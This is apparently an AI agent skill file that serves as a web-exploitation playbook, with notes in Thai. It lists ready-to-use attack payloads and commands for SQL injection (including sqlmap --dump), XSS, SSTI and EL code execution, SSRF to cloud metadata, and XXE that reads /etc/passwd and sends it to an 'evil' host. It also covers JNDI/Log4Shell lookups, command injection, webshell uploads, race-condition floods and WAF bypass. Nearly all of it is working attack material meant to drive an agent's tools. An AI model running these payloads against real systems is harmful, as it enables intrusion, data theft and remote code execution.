---
name: losthex-web
description: >-
  Web exploitation — SQLi, XSS, SSTI, SSRF, XXE, LFI, file upload, CSRF, CORS, open redirect, smuggling, cache deception, prototype pollution. Triggers: SQL injection, XSS, SSTI, SSRF, XXE, LFI, file upload, CSRF, CORS, open redirect, request smuggling, cache deception, prototype pollution, WAF bypass.
---
# LostHex-WEB

## Gate

```bash
python "$HOME/.workbuddy-ai/skills/losthex-hack/scripts/gate.py"   # bundled gate = HexStrike health check
# hexstrike: nuclei_scan, sqlmap_scan, dalfox_scan, ffuf_scan
```

## Quick triage (ก่อนทดสอบ payload)

```bash
nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei.txt
ffuf -u https://target.com/FUZZ -w params.txt -mc 200,301,302,500
# เก็บ baseline response (length/status) ก่อนทุก test
```

## Payloads (minimal + verify)

### SQLi
```bash
# manual
' OR 1=1-- -
1' UNION SELECT null,@@version-- -
# verify
sqlmap -u "https://target.com/item?id=1" --batch --risk 1 --level 1 --dump --threads 2
# time-based
' OR SLEEP(5)-- -
```
Verify: error message / time delay / `sqlmap --current-user` สำเร็จ

### XSS
```
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
'"><script>alert(1)</script>
```
Verify: reflect + `Content-Type: text/html` + ไม่ถูก encode; ใช้ `dalfox url https://target.com/?q=FUZZ` เพื่อ confirm
Bypass: ดู `xss-cross-site-scripting/ADVANCED_XSS_TRICKS.md` pattern

### SSTI
```
{{7*7}}  ${7*7}  <%=7*7%>  #{7*7}  *{7*7}
{{config}}  {{self.__class__}}
```
Verify: response มี `49` และ engine fingerprint; แล้วลอง `{{''.__class__.mro()[1].__subclasses__()}}`

### SSRF
```
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
http://[::ffff:127.0.0.1]/
```
Verify: fetch internal + time diff; ดู `ssrf/URL_PARSER_TRICKS.md` สำหรับ bypass (0x, octal, @ trick)
HexStrike: `mcp__hexstrike-ai__execute_command`

### XXE
```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
<!DOCTYPE x [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY send SYSTEM 'http://evil/%f;'>">%e;]>
```
Verify: file content reflected / OOB http log

### LFI / Path Traversal
```
../../../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input + POST body
```
Verify: `root:x:` หรือ base64 decode ได้

### Upload
- ลอง `.phtml`, `.phar`, `.svg`, `%.php`, `file.php%00.jpg`
- `Content-Type: image/png` + magic bytes `\x89PNG`
- Polyglot + `exif` injection
Verify: เข้าถึงไฟล์ที่อัปโหลดได้ + execute (เช่น `?cmd=id`)

### CSRF / CORS / Open Redirect / Smuggling / Cache / PP
- CSRF: สร้าง form auto-submit + เช็ค `SameSite` / token
- CORS: `Origin: https://evil.com` -> `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true`
- Open redirect: `?next=//evil.com`, `?url=https:evil.com`, `\/\/evil.com`
- Smuggling: `CL.TE` / `TE.CL` + `H2.CL` ดู `request-smuggling/H2_SMUGGLING_VARIANTS.md`
- Cache deception: `/profile.css` trick + `X-Cache: HIT`
- Prototype pollution: `__proto__[polluted]=1` + `constructor[prototype][polluted]=1`

## Verify contract

ทุก finding ต้องมี `request.txt` + `response.txt` + screenshot/curl proof ใน `evidence/`

## Injection (CMDi / EL / Deserialization / JNDI)

```bash
# CMDi
; id  | id  & id  && id  $(id)  `id`  |powershell -c whoami
# verify: sleep 5 / nslookup evil.com
# bypass: ${IFS}, $'\x20', %0a

# EL injection (Spring/OGNL)
${7*7}  #{7*7}  ${T(java.lang.Runtime).getRuntime().exec('id')}
# engine map: Spring EL, OGNL, MVEL — ดู expression-language-injection/SKILL.md

# Deserialization (Java)
# ysoserial payload -> base64 -> param
# gadget chains: CommonsCollections, Spring — ดู JAVA_GADGET_CHAINS.md
# verify: dnslog / sleep via gadget

# JNDI (Log4Shell style)
${jndi:ldap://evil/a}  ${jndi:rmi://evil/a}
# verify: LDAP callback log — ดู jndi-injection/SKILL.md
```
Verify: OOB callback (dnslog/interactsh) + command output reflected
HexStrike: `mcp__hexstrike-ai__execute_command` (CMDi), manual for EL/JNDI


## Business Logic & Race

```bash
# Business logic — ดู business-logic-vulnerabilities/CHECKLIST.md
# coupon reuse, price tamper (client-side), workflow bypass (skip step 2 -> 4)
# limit bypass: negative qty, 0 price, race on checkout
curl -X POST -d '{"price":0}' https://target.com/api/checkout
curl -X POST -d '{"coupon":"TEST10"}' https://target.com/api/apply # replay 10x

# Race condition
for i in {1..20}; do curl -s https://target.com/api/claim & done; wait
# TOCTOU: check -> use window — ดู race-condition/templates
```
Verify: balance/coupon/state diff หลัง concurrent requests


Ponytail: ตัด WAF bypass แบบ heavy obfuscation — ceiling = basic encode + case mix, upgrade เมื่อเจอ WAF block (ดู waf-bypass).